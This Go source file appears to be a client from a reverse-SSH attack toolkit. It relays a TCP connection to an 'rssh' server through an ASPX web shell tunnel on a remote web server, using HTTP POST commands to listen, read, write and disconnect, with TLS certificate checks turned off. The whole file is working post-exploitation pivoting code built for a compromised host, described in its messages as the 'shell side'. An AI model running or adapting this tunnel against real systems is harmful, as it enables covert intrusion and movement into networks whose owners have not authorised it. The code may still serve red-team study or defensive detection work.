package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"os/signal"
)

func check(r string, err error) {
	if err != nil {
		log.Fatal(r, err)
	}
}

type WebReaderWriter struct {
	client http.Client
	url    string
}

func (wr *WebReaderWriter) Write(p []byte) (n int, err error) {
	resp, err := wr.client.Post(wr.url+"?cmd=write", "application/octet-stream", bytes.NewBuffer(p))
	if err != nil {
		return 0, err
	}
	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()

	if resp.Header.Get("X-STATUS") != "OK" {
		return 0, fmt.Errorf("Write failed: %s", resp.Header.Get("x-error"))
	}

	return len(p), nil
}

func (wr *WebReaderWriter) Read(p []byte) (n int, err error) {
	resp, err := wr.client.Post(wr.url+"?cmd=read", "text/plain", nil)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	if resp.Header.Get("X-STATUS") != "OK" {
		return 0, fmt.Errorf("Read failed: %s", resp.Header.Get("x-error"))
	}

	n, err = resp.Body.Read(p)

	return n, err
}

func (wr *WebReaderWriter) Close() error {
	log.Println("Sending close message")
	resp, err := wr.client.Post(wr.url+"?cmd=disconnect", "text/plain", nil)
	if err != nil {
		return err
	}
	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()

	if resp.Header.Get("X-STATUS") != "OK" {
		return fmt.Errorf("Failed to close port: %s", resp.Header.Get("X-ERROR"))
	}

	wr.client.CloseIdleConnections()

	return nil
}

func NewWebReaderWriter(url, port string) (*WebReaderWriter, error) {

	cert, err := tls.LoadX509KeyPair("certs/client.cert", "certs/client.key")
	if err != nil {
		log.Fatalf("server: loadkeys: %s", err)
	}

	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}
	resp, err := client.Post(url+"?cmd=listen&port="+port, "text/plain", nil)
	if err != nil {
		return nil, err
	}
	resp.Body.Close()

	if resp.Header.Get("X-STATUS") != "OK" {
		return nil, fmt.Errorf("Failed to listen on shell side: %s", resp.Header.Get("X-ERROR"))
	}

	return &WebReaderWriter{url: url, client: *client}, nil
}

func main() {
	if len(os.Args) < 3 {
		log.Println(os.Args[0], "<rssh address> <aspx tunnel loc> <remote listen port>")
		log.Fatal("Need aspx tunnel url, and rssh location")
	}

	rsshCon, err := net.Dial("tcp", os.Args[1])
	check("Connection to rssh could not be established", err)
	defer rsshCon.Close()

	wbr, err := NewWebReaderWriter(os.Args[2], os.Args[3])
	check("Unable to create new proxy web reader writer: ", err)
	defer func() {
		log.Println(wbr.Close())
	}()

	log.Printf("Connecting rssh '%s', to '%s'\n", os.Args[1], os.Args[2])

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)

	log.Println("Running copy operations")
	go func() {
		_, err = io.Copy(wbr, rsshCon)
		check("Error write op: ", err)
	}()
	go func() {
		_, err := io.Copy(rsshCon, wbr)
		check("Error read op: ", err)
	}()

	<-c

}
